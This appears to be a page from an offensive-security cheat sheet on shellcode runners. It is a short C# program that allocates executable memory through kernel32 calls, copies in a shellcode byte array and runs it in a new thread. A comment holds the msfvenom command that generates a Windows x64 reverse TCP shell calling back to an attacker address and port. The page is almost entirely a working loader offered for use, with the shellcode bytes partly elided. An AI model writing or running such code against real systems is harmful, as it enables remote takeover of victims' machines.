# ⭕ Shellcode Runners/Injectors

## <mark style="color:red;">C# Shellcode Runner</mark>

```
using System;
using System.Runtime.InteropServices;

namespace TestClass
{
    class TestClass
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);
        static void Main(string[] args)
        {

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=6969 exitfunc=thread  -f csharp -a x64
    
        byte[] buf = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
...0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };


            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

##











